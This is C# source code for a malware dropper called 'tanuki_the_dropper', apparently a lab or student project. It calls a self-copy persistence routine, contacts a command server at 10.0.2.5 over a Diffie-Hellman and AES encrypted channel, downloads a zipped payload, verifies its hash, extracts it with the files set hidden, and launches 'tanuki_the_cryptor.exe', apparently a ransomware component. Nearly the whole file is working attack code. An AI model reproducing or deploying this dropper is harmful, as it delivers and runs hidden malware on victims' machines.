using Packets;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Numerics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace tanuki_the_dropper
{
    class Program
    {
        
        static void Main(string[] args)
        {
            Console.WriteLine("tanuki!!!!!!!!");

            Persistence persistence = new Persistence();
            persistence.SelfCopy();

            Dropper dropper = new Dropper();
            dropper.Execute();

            Console.ReadLine();
        }
    }

    class Dropper
    {
        private BigInteger dh_key;
        private BigInteger aes_key;
        private Communication comm;
        private int RetryTimes = 3;
        private int WaitTime = 6000;

        public void Execute()
        {
            for (int i = 0; i < RetryTimes; i++)
            {
                try
                {
                    KeyGeneration();
                    ExeExec();
                    break;
                }
                catch (Exception Ex)
                {
                    Console.WriteLine($"Error try {i}");
                    Task.Delay(WaitTime).Wait();
                }
            }
        }

        private void KeyGeneration()
        {
            BigInteger x;
            BigInteger gx;
            try
            {
                comm = new Communication("10.0.2.5", 65432);

                byte[] keyGenRequest_bytes = Packet.GenNewRequest("keyExchangeGen");

                comm.Start();

                comm.SendMessage(keyGenRequest_bytes);
                byte[] response_byte = comm.RecvMessage(1024);

                (string prime, string generator, string gx_server) = Packet.GetServerKeyParameters(response_byte);
                (x, gx, dh_key) = Cryptography.GenerateDHValues_X_GX_KEY(BigInteger.Parse(prime), BigInteger.Parse(generator), BigInteger.Parse(gx_server));

                byte[] parameters_bytes = Packet.SendClientParameters("keyExchangeAns", gx);
                comm.SendMessage(parameters_bytes);

                Console.WriteLine("DH Key int: " + dh_key.ToString());
                Console.WriteLine("DH Key hex: " + dh_key.ToString("X"));

                aes_key = new BigInteger(Cryptography.ComputeAESKey(dh_key.ToString("X")));

                Console.WriteLine("AES Key hex: " + ByteArrayToString(this.aes_key.ToByteArray()));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Could not generate dropper's keys: " + ex.Message);

                if(comm != null)
                {
                    byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
                    comm.SendMessage(endRequest_bytes);
                }

                comm.Close();
                throw;
            }
        }

        private void ExeExec()
        {
            try
            {
                (byte[] exeZip_bytes, int bytesRead) = (null, 0);
                for (int i = 0; i < RetryTimes; i++)
                {
                    try
                    {
                        byte[] exeInfoRequest_bytes = Packet.GenNewRequest("exeSend");
                        comm.SendMessage(exeInfoRequest_bytes);

                        byte[] response_byte = Cryptography.AESDecrypt(comm.RecvMessage(4096), aes_key.ToByteArray());
                        Console.WriteLine("Message length: " + response_byte.Length);

                        (string serverHash, int serverSize) = Packet.GetExeInfo(response_byte);

                        (exeZip_bytes, bytesRead) = comm.RecvBinary(serverSize);

                        if (bytesRead != serverSize)
                        {
                            Console.WriteLine("EXE size error: ");
                            continue;
                        }

                        exeZip_bytes = Cryptography.AESDecrypt(exeZip_bytes, aes_key.ToByteArray());
                        string clientHash = Cryptography.GetHash(exeZip_bytes);

                        if (!clientHash.Equals(serverHash))
                        {
                            Console.WriteLine("EXE hash error: ");
                            Console.WriteLine("Hash server: " + serverHash);
                            Console.WriteLine("Client server: " + clientHash);
                            continue;
                        }

                        break;
                    }
                    catch(Exception ex) { Console.WriteLine(ex.ToString()); if (i == 2) throw; }
                }

                Console.WriteLine("Writing zip.");
                Console.WriteLine("Bytes recieved: " + bytesRead);
                Console.WriteLine("Bytes zip: " + bytesRead);
                using (FileStream file = new FileStream("malware.zip", FileMode.Create, FileAccess.Write))
                {
                    file.Write(exeZip_bytes, 0, exeZip_bytes.Length);
                    //File.SetAttributes("malware.zip", File.GetAttributes("malware.zip") | FileAttributes.Hidden);
                }

                Console.WriteLine("Extracting zip.");
                ZipFile.ExtractToDirectory("malware.zip", ".\\malware");
                foreach(string file in Directory.GetFiles(".\\malware"))
                {
                    File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
                }

                byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
                comm.SendMessage(endRequest_bytes);

                Exec.ExecProgram(".\\malware\\tanuki_the_cryptor.exe");

                Console.WriteLine("Binary file received and saved.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Could not execute malware: " + ex.Message);

                if (File.Exists("malware.zip")) { File.Delete("malware.zip"); }
                if (Directory.Exists("malware"))
                {
                    foreach (string file in Directory.EnumerateFiles("malware"))
                        File.Delete(file);
                    Directory.Delete("malware");
                }

                byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
                comm.SendMessage(endRequest_bytes);

                comm.Close();
                throw;
            }

        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

    }

}